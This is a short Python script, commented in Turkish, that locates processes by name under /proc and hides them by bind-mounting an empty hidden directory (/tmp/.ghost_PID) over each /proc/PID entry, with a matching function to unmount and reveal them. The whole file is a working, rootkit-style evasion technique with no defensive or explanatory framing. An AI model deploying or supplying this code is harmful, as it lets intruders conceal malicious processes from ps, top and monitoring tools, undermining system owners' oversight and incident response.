import os
import subprocess

def find_pids_by_name(process_name):
    """İşlem adına göre sistemdeki tüm eşleşen PID'leri bulur."""
    pids = []
    try:
        # /proc dizinindeki sayısal klasörleri tara
        for pid in [d for d in os.listdir('/proc') if d.isdigit()]:
            try:
                with open(os.path.join('/proc', pid, 'comm'), 'r') as f:
                    if process_name in f.read().strip():
                        pids.append(int(pid))
            except (FileNotFoundError, ProcessLookupError, PermissionError):
                continue
    except PermissionError:
        print("[-] Hata: /proc dizini okunamadı. Root yetkisi gerekebilir.")
    return pids

def hide_process(pid):
    """PID dizinini boş bir dizine bağlayarak (bind mount) gizler."""
    try:
        tmp_dir = f"/tmp/.ghost_{pid}"
        if not os.path.exists(tmp_dir):
            os.makedirs(tmp_dir)
        
        cmd = ["mount", "--bind", tmp_dir, f"/proc/{pid}"]
        subprocess.run(cmd, check=True)
        return True
    except Exception as e:
        print(f"[-] Gizleme hatası (PID {pid}): {e}")
        return False

def reveal_process(pid):
    """Gizlenen işlemi tekrar görünür yapar (unmount)."""
    try:
        cmd = ["umount", f"/proc/{pid}"]
        subprocess.run(cmd, check=True)
        
        # Geçici dizini temizle
        tmp_dir = f"/tmp/.ghost_{pid}"
        if os.path.exists(tmp_dir):
            os.rmdir(tmp_dir)
        return True
    except Exception as e:
        print(f"[-] Görünür yapma hatası (PID {pid}): {e}")
        return False
